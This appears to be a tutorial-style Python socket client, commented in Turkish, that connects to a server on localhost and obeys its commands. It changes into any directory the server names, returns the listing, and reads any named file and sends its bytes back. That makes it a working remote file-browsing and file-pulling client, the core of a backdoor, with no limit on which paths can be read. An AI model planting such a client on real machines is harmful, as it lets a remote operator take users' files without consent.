import socket as s
import os
import sys

# Bana soru sormak için veya daha fazla türkce kaynak için instagram ve GitHub da takip edebilirsin.
# github.com/canemingozde
# instagram.com/canemingozde


class Client:
    host = "127.0.0.1"
    port = 63541
    client = s.socket(s.AF_INET,s.SOCK_STREAM)
    def __init__(self):
        self.client.connect((self.host,self.port))
        

    def msj_set(self,msj):
        msj = str(msj)
        self.client.send(msj.encode())


    def msj_get(self):
        gelen_mesaj = self.client.recv(1024).decode()
        return gelen_mesaj


    def dosya_set(self,dosya):
        self.client.send(dosya)


    def dosya_get(self):
        gelen_dosya = self.client.recv(1024)
        return gelen_dosya


    
    def dosya(self):
        gelen_istem2 = self.msj_get()
        if gelen_istem2 == "dizin":
            self.dizin()
        else:
            with open(gelen_istem2,"rb") as file:
                dosya_oku = file.read()
                while dosya_oku:
                    self.dosya_set(dosya_oku)
                    dosya_oku = file.read()
            print("********** Dosya gönderildi. **********")
            sys.exit()

        
        
    def dizin(self):
        while True:
           gelen_istem = self.msj_get()
           if gelen_istem == "close":
               break
           elif gelen_istem == "dosya":
               self.dosya()
           else:
               dizin_kök = os.chdir(gelen_istem)           
               icerik = os.listdir(dizin_kök)
               self.msj_set(icerik)   
                 
                
                            

if __name__ == "__main__":
   a = Client()
   a.dizin()
   



 








    





